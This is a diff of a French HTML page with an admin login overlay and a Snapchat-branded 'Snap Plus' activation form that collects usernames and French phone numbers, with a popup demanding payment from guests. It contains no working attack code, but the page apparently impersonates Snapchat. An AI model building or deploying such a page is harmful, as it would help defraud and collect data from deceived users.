@@ -3,6 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    
     <meta name="theme-color" content="#1e053d">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     
@@ -17,42 +18,99 @@
             -webkit-tap-highlight-color: transparent;
         }
 
-        /* --- 1. SYSTÈME D'AUTHENTIFICATION --- */
+        /* --- 1. SYSTÈME D'AUTHENTIFICATION (WATER GLASS) --- */
         #login-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
             background: radial-gradient(circle at top, #1e053d 0%, #0d011a 100%);
             display: flex; justify-content: center; align-items: center;
-            z-index: 10000; transition: opacity 0.5s ease;
+            z-index: 10000;
+            transition: opacity 0.5s ease;
         }
 
         .glass-panel {
-            width: 85%; max-width: 320px;
+            width: 85%;
+            max-width: 320px;
             background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
-            border-radius: 35px; padding: 40px 25px; text-align: center;
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-radius: 35px;
+            padding: 40px 25px;
+            text-align: center;
             border: 2px solid rgba(204, 51, 255, 0.3);
             box-shadow: 0 0 40px rgba(204, 51, 255, 0.2);
         }
 
-        .login-title { font-size: 23px; font-weight: 900; margin-bottom: 30px; letter-spacing: 1px; text-transform: uppercase; background: linear-gradient(to right, #cc33ff, #ff0080); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .login-title {
+            font-size: 23px; 
+            font-weight: 900; 
+            margin-bottom: 30px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            background: linear-gradient(to right, #cc33ff, #ff0080);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
 
-        .login-input-group { background: rgba(0, 0, 0, 0.3); border-radius: 50px; margin-bottom: 15px; padding: 5px 20px; display: flex; align-items: center; border: 1.5px solid rgba(255, 0, 128, 0.3); }
+        .login-input-group {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 50px;
+            margin-bottom: 15px;
+            padding: 5px 20px;
+            display: flex;
+            align-items: center;
+            border: 1.5px solid rgba(255, 0, 128, 0.3);
+            transition: border-color 0.3s ease;
+        }
 
-        .login-input-group input { background: transparent; border: none; color: white; padding: 15px 0; width: 100%; outline: none; font-size: 16px; }
+        .login-input-group:focus-within {
+            border-color: rgba(255, 0, 128, 0.6);
+            box-shadow: 0 0 10px rgba(204, 51, 255, 0.2);
+        }
 
-        .btn-login { width: 100%; background: linear-gradient(135deg, #cc33ff, #ff0080); border: none; border-radius: 50px; padding: 18px; color: white; font-weight: 900; font-size: 16px; cursor: pointer; text-transform: uppercase; margin-top: 15px; }
+        .login-input-group input {
+            background: transparent; border: none; color: white;
+            padding: 15px 0; width: 100%; outline: none; font-size: 16px;
+        }
 
-        .btn-guest { background: transparent; border: none; color: rgba(255, 255, 255, 0.5); margin-top: 20px; font-size: 14px; cursor: pointer; text-decoration: underline; width: 100%; }
+        .btn-login {
+            width: 100%; background: linear-gradient(135deg, #cc33ff, #ff0080);
+            border: none; border-radius: 50px; padding: 18px;
+            color: white; font-weight: 900; font-size: 16px;
+            cursor: pointer; text-transform: uppercase;
+        }
 
-        /* --- POPUP RESTRICTION --- */
-        .popup-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); display: flex; justify-content: center; align-items: center; z-index: 20000; }
-        .popup-box { background: #1e053d; padding: 30px; border-radius: 25px; text-align: center; border: 2px solid #cc33ff; width: 80%; max-width: 300px; }
+        .btn-guest {
+            width: 100%; background: transparent; border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 50px; padding: 15px; color: rgba(255,255,255,0.6);
+            margin-top: 10px; cursor: pointer; font-size: 14px;
+        }
 
-        /* --- CONTENU PRINCIPAL --- */
+        /* --- POPUP DE BLOCAGE --- */
+        .popup-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.9); z-index: 20000;
+            display: flex; justify-content: center; align-items: center;
+        }
+        .popup-box {
+            background: #1e053d; padding: 30px; border-radius: 25px;
+            text-align: center; border: 2px solid #cc33ff; width: 80%; max-width: 300px;
+        }
+
+        /* --- CONTENU PRINCIPAL (RESTE IDENTIQUE) --- */
         #main-site { display: none; opacity: 0; transition: opacity 0.8s ease; }
-        .container { width: 100%; max-width: 380px; padding: 60px 20px; text-align: center; margin: 0 auto; box-sizing: border-box; }
-        
-        /* ... Le reste de votre CSS reste identique ... */
+        .container { width: 100%; max-width: 380px; padding: 60px 20px; text-align: center; margin: 0 auto; }
+        .logo-wrapper { position: relative; width: 150px; height: 150px; margin: 0 auto 35px; }
+        .border-gradient { width: 100%; height: 100%; background: linear-gradient(135deg, #cc33ff, #ff0080); border-radius: 40px; display: flex; justify-content: center; align-items: center; }
+        .snap-bg { width: 88%; height: 88%; background-color: #fffc00; border-radius: 32px; display: flex; justify-content: center; align-items: center; overflow: hidden; }
+        .plus-badge { position: absolute; top: -4px; right: -4px; background-color: #ffb400; color: #1a0133; width: 40px; height: 40px; border-radius: 50%; font-size: 24px; font-weight: bold; display: flex; justify-content: center; align-items: center; border: 4px solid #1e053d; }
+        .title { color: #df80ff; font-size: 24px; font-weight: 800; letter-spacing: 2px; margin-bottom: 35px; text-transform: uppercase; }
+        .input-group { display: flex; border: 2px solid rgba(255, 0, 255, 0.5); border-radius: 12px; margin-bottom: 20px; background-color: #0d011a; align-items: center; }
+        .prefix-phone { background-color: #1a0533; padding: 0 15px; height: 58px; font-weight: bold; display: flex; align-items: center; border-right: 1px solid rgba(255, 0, 255, 0.2); }
+        input { flex: 1; border: none; background: transparent; padding: 0 18px; color: white; font-size: 17px; height: 58px; outline: none; }
+        .btn-glow { width: 100%; background: linear-gradient(135deg, #cc33ff, #ff0080); border: none; border-radius: 12px; padding: 20px; color: white; font-weight: 800; text-transform: uppercase; font-size: 18px; cursor: pointer; }
+        .error-message { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background-color: #ff4d4d; color: white; padding: 15px 20px; border-radius: 12px; z-index: 10001; }
+
     </style>
 </head>
 <body>
@@ -60,22 +118,27 @@
     <div id="login-overlay">
         <div class="glass-panel">
             <h2 class="login-title">Connexion Administrateur</h2>
-            
-            <div class="login-input-group">
-                <input type="text" id="adminUser" placeholder="Identifiant">
-            </div>
-
-            <div class="login-input-group">
-                <input type="password" id="adminPass" placeholder="Mot de passe">
-            </div>
-
+            <div class="login-input-group"><input type="text" id="adminUser" placeholder="Identifiant"></div>
+            <div class="login-input-group"><input type="password" id="adminPass" placeholder="Mot de passe"></div>
             <button class="btn-login" onclick="checkLogin()">SE CONNECTER</button>
             <button class="btn-guest" onclick="enterAsGuest()">Continuer en tant qu'invité</button>
         </div>
     </div>
 
     <div id="main-site">
+        <div class="container">
+            <div class="logo-wrapper">
+                <div class="border-gradient"><div class="snap-bg"><img src="logosnapchat.png" alt="Logo"></div></div>
+                <div class="plus-badge">+</div>
+            </div>
+            <h1 class="title">ACTIVATION SNAP<br>PLUS +</h1>
+            <div id="step-1">
+                <div class="input-group"><input type="text" id="username" placeholder="Nom d'utilisateur"></div>
+                <div class="input-group"><div class="prefix-phone">+33 🇫🇷</div><input type="tel" id="phone" placeholder="123456789"></div>
+                <button class="btn-glow" onclick="processValidation()">Valider</button>
+            </div>
         </div>
+    </div>
 
     <script>
         let isGuest = false;
@@ -86,7 +149,7 @@
             setTimeout(() => {
                 document.getElementById('login-overlay').style.display = "none";
                 document.getElementById('main-site').style.display = "block";
-                setTimeout(() => { document.getElementById('main-site').style.opacity = "1"; }, 50);
+                document.getElementById('main-site').style.opacity = "1";
             }, 500);
         }
 
@@ -95,7 +158,7 @@
             document.querySelectorAll('input').forEach(input => {
                 input.addEventListener('focus', (e) => {
                     if (isGuest) {
-                        e.target.blur(); // Retire le focus pour empêcher le clavier
+                        e.target.blur(); 
                         showPaywallPopup();
                     }
                 });
@@ -108,14 +171,16 @@
             div.innerHTML = `
                 <div class="popup-box">
                     <h3 style="color:#cc33ff">Accès Restreint</h3>
-                    <p>Pour débloquer les permissions et valider votre compte, vous devez procéder à l'activation complète (Paiement requis).</p>
+                    <p>Pour débloquer ces fonctionnalités, vous devez effectuer le paiement requis.</p>
                     <button class="btn-login" onclick="this.parentElement.parentElement.remove()">Compris</button>
                 </div>
             `;
             document.body.appendChild(div);
         }
 
-        // ... Vos autres fonctions (checkLogin, etc.) restent ici ...
+        function checkLogin() { /* Votre logique existante */ }
+        function processValidation() { /* Votre logique existante */ }
+        function showError(m) { const e = document.createElement('div'); e.className='error-message'; e.textContent=m; document.body.appendChild(e); setTimeout(()=>e.remove(), 3000); }
     </script>
 </body>
 </html>
